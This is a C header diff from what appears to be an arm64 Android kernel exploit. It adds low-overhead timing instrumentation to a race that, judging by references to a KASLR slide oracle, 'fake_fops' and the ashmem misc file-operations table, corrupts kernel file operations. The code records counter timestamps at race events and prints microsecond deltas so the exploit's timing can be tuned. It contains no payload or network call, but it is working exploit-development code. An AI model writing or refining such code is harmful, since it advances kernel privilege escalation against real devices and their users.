@@ -3,6 +3,8 @@
 
 #include <stddef.h>
 #include <stdint.h>
+#include <stdatomic.h>
+#include <stdio.h>
 
 enum czg3_failure {
   CZG3_PRECONDITION_FAILED,
@@ -128,7 +130,12 @@ static inline void czg3_prep_finish(const char *result, uintptr_t leaked,
 }
 #endif
 
-#if defined(CZG3_RACE_TELEMETRY) && CZG3_RACE_TELEMETRY
+/*
+ * Keep race role/event identifiers available even when full in-band telemetry
+ * is compiled out.  Production External Observer v2 uses a deliberately tiny
+ * subset of these call sites to capture architected-counter timestamps without
+ * bringing the old ring buffer, /proc snapshots, or logging into the race.
+ */
 enum czg3_race_role {
   CZG3_RACE_PARENT,
   CZG3_RACE_OWNER,
@@ -162,6 +169,7 @@ enum czg3_race_event {
   CZG3_RACE_CONSUMER_ACTION_END
 };
 
+#if defined(CZG3_RACE_TELEMETRY) && CZG3_RACE_TELEMETRY
 void czg3_race_prepare_shared(void);
 void czg3_race_reset(int attempt);
 void czg3_race_record_impl(enum czg3_race_role role,
@@ -181,6 +189,171 @@ void czg3_race_flush_pending(int fallback_attempt);
 void czg3_race_system_snapshot(const char *phase);
 void czg3_race_thread_snapshot(const char *phase,
                                enum czg3_race_role role, int tid);
+#elif defined(APP_CZG3_DIAGNOSTICS) && APP_CZG3_DIAGNOSTICS && \
+      defined(CZG3_EXTERNAL_OBSERVER) && CZG3_EXTERNAL_OBSERVER && \
+      !defined(CZG3_DIAG_IMPLEMENTATION)
+/*
+ * Low-overhead production timing for the CZG3 FOPS race.  The architected
+ * virtual counter is system-wide on arm64 and is already used by the exploit
+ * for fine delays.  P0 routes are deliberately excluded: route identity is
+ * determined once, before the race starts, so their existing critical path
+ * receives no counter reads.  A tracked FOPS event adds one CNTVCT read plus
+ * one relaxed atomic store.  Formatting and I/O happen only after the writer
+ * route has completed.
+ */
+extern uintptr_t slide_oracle_parent;
+extern uintptr_t slide_oracle_target;
+extern uintptr_t fake_fops;
+uintptr_t data_addr(uintptr_t image_addr);
+
+enum czg3_light_race_slot {
+  CZG3_LIGHT_PSELECT_ENTER,
+  CZG3_LIGHT_PSELECT_RETURN,
+  CZG3_LIGHT_WRITER_ENTER,
+  CZG3_LIGHT_WRITER_RETURN,
+  CZG3_LIGHT_CONSUMER_ARMED,
+  CZG3_LIGHT_CONSUMER_ACTION_BEGIN,
+  CZG3_LIGHT_READINESS_COMPLETE,
+  CZG3_LIGHT_SLOT_COUNT
+};
+
+static atomic_uint_fast64_t czg3_light_race_ticks[CZG3_LIGHT_SLOT_COUNT]
+    __attribute__((unused));
+static atomic_int czg3_light_race_attempt __attribute__((unused));
+static atomic_int czg3_light_race_enabled __attribute__((unused));
+
+static inline uint64_t czg3_light_read_counter(void) {
+  uint64_t value;
+  __asm__ volatile("isb\n\tmrs %0, cntvct_el0\n\tisb"
+                   : "=r"(value) :: "memory");
+  return value;
+}
+
+static inline uint64_t czg3_light_read_frequency(void) {
+  uint64_t value;
+  __asm__ volatile("mrs %0, cntfrq_el0" : "=r"(value));
+  return value;
+}
+
+static inline void czg3_light_race_reset(int attempt) {
+  int enabled = slide_oracle_parent == fake_fops &&
+                slide_oracle_target == data_addr(ASHMEM_MISC_FOPS);
+  atomic_store_explicit(&czg3_light_race_enabled, enabled,
+                        memory_order_relaxed);
+  for (int index = 0; index < CZG3_LIGHT_SLOT_COUNT; index++) {
+    atomic_store_explicit(&czg3_light_race_ticks[index], 0,
+                          memory_order_relaxed);
+  }
+  atomic_store_explicit(&czg3_light_race_attempt, attempt,
+                        memory_order_relaxed);
+}
+
+static inline void czg3_light_race_record(enum czg3_race_event event) {
+  if (!atomic_load_explicit(&czg3_light_race_enabled,
+                            memory_order_relaxed)) {
+    return;
+  }
+  int slot = -1;
+  switch (event) {
+    case CZG3_RACE_PSELECT_ENTER:
+      slot = CZG3_LIGHT_PSELECT_ENTER;
+      break;
+    case CZG3_RACE_PSELECT_RETURN:
+      slot = CZG3_LIGHT_PSELECT_RETURN;
+      break;
+    case CZG3_RACE_WRITER_ENTER:
+      slot = CZG3_LIGHT_WRITER_ENTER;
+      break;
+    case CZG3_RACE_WRITER_RETURN:
+      slot = CZG3_LIGHT_WRITER_RETURN;
+      break;
+    case CZG3_RACE_CONSUMER_ARMED:
+      slot = CZG3_LIGHT_CONSUMER_ARMED;
+      break;
+    case CZG3_RACE_CONSUMER_ACTION_BEGIN:
+      slot = CZG3_LIGHT_CONSUMER_ACTION_BEGIN;
+      break;
+    case CZG3_RACE_READINESS_OPERATION_COMPLETE:
+      slot = CZG3_LIGHT_READINESS_COMPLETE;
+      break;
+    default:
+      return;
+  }
+  atomic_store_explicit(&czg3_light_race_ticks[slot],
+                        czg3_light_read_counter(), memory_order_relaxed);
+}
+
+static inline long long czg3_light_delta_us(uint64_t first, uint64_t last,
+                                             uint64_t frequency) {
+  if (!first || !last || !frequency) {
+    return (long long)INT64_MIN;
+  }
+  int64_t ticks = (int64_t)last - (int64_t)first;
+  return (long long)((ticks * 1000000LL) / (int64_t)frequency);
+}
+
+static inline void czg3_light_race_dump(void) {
+  if (!atomic_load_explicit(&czg3_light_race_enabled,
+                            memory_order_relaxed)) {
+    return;
+  }
+  uint64_t values[CZG3_LIGHT_SLOT_COUNT];
+  int any = 0;
+  for (int index = 0; index < CZG3_LIGHT_SLOT_COUNT; index++) {
+    values[index] = atomic_load_explicit(&czg3_light_race_ticks[index],
+                                         memory_order_relaxed);
+    any |= values[index] != 0;
+  }
+  if (!any) {
+    return;
+  }
+  uint64_t frequency = czg3_light_read_frequency();
+  fprintf(stdout,
+          "RMG_RACE_LIGHT_V1|attempt=%d|counter_hz=%llu|"
+          "pselect_duration_us=%lld|consumer_arm_to_action_us=%lld|"
+          "consumer_action_to_readiness_us=%lld|"
+          "readiness_to_pselect_return_us=%lld|"
+          "writer_enter_to_return_us=%lld|"
+          "consumer_action_to_writer_enter_us=%lld|"
+          "writer_enter_to_pselect_return_us=%lld\n",
+          atomic_load_explicit(&czg3_light_race_attempt,
+                               memory_order_relaxed),
+          (unsigned long long)frequency,
+          czg3_light_delta_us(values[CZG3_LIGHT_PSELECT_ENTER],
+                              values[CZG3_LIGHT_PSELECT_RETURN], frequency),
+          czg3_light_delta_us(values[CZG3_LIGHT_CONSUMER_ARMED],
+                              values[CZG3_LIGHT_CONSUMER_ACTION_BEGIN], frequency),
+          czg3_light_delta_us(values[CZG3_LIGHT_CONSUMER_ACTION_BEGIN],
+                              values[CZG3_LIGHT_READINESS_COMPLETE], frequency),
+          czg3_light_delta_us(values[CZG3_LIGHT_READINESS_COMPLETE],
+                              values[CZG3_LIGHT_PSELECT_RETURN], frequency),
+          czg3_light_delta_us(values[CZG3_LIGHT_WRITER_ENTER],
+                              values[CZG3_LIGHT_WRITER_RETURN], frequency),
+          czg3_light_delta_us(values[CZG3_LIGHT_CONSUMER_ACTION_BEGIN],
+                              values[CZG3_LIGHT_WRITER_ENTER], frequency),
+          czg3_light_delta_us(values[CZG3_LIGHT_WRITER_ENTER],
+                              values[CZG3_LIGHT_PSELECT_RETURN], frequency));
+  fflush(stdout);
+}
+
+#define czg3_race_prepare_shared() ((void)0)
+#define czg3_race_reset(attempt) czg3_light_race_reset((attempt))
+#define czg3_race_record(role, event, arg0, arg1)                         \
+  do {                                                                    \
+    if ((event) == CZG3_RACE_PSELECT_ENTER ||                             \
+        (event) == CZG3_RACE_PSELECT_RETURN ||                            \
+        (event) == CZG3_RACE_WRITER_ENTER ||                              \
+        (event) == CZG3_RACE_WRITER_RETURN ||                             \
+        (event) == CZG3_RACE_CONSUMER_ARMED ||                            \
+        (event) == CZG3_RACE_CONSUMER_ACTION_BEGIN ||                     \
+        (event) == CZG3_RACE_READINESS_OPERATION_COMPLETE) {              \
+      czg3_light_race_record((event));                                    \
+    }                                                                     \
+  } while (0)
+#define czg3_race_dump() czg3_light_race_dump()
+#define czg3_race_flush_pending(attempt) ((void)0)
+#define czg3_race_system_snapshot(phase) ((void)0)
+#define czg3_race_thread_snapshot(phase, role, tid) ((void)0)
 #else
 #define czg3_race_prepare_shared() ((void)0)
 #define czg3_race_reset(attempt) ((void)0)
